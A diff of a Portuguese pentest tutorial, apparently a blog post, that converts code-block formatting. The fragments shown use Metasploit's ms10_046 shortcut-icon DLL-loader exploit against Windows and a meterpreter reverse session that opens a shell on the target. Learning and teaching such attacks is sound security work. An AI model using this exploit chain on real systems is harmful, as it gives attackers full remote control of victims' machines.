@@ -66,10 +66,10 @@ cria um serviço e espera o alvo acessar a URL para injetar um DLL malicioso no 
 
 No console do metasploit informo o exploit que irei usar com o comando `use`:
 
-{% highlight bash %}
+```bash
 msf > use exploit/windows/browser/ms10_046_shortcut_icon_dllloader
 msf exploit(ms10_046_shortcut_icon_dllloader) >
-{% endhighlight %}
+```
 
 Em seguida listo as opções oferecidas para a execução do exploit:
 
@@ -117,7 +117,7 @@ e cada etapa é informada:
 Por fim a conexão reversa é estabelecida ou seja o alvo conectou-se ao atacante,
 uma sessão do `meterpreter` é aberta e agora podemos entrar no **MS-DOS** do alvo:
 
-{% highlight shell-session %}
+```bash
 meterpreter >
 meterpreter > shell
 Process 3180 created.
@@ -144,7 +144,7 @@ dir
                4 pasta(s)      996.515.840 bytes disponíveis
 
 C:\>
-{% endhighlight %}
+```
 
 Simplesmente agora temos acesso total a máquina!
 
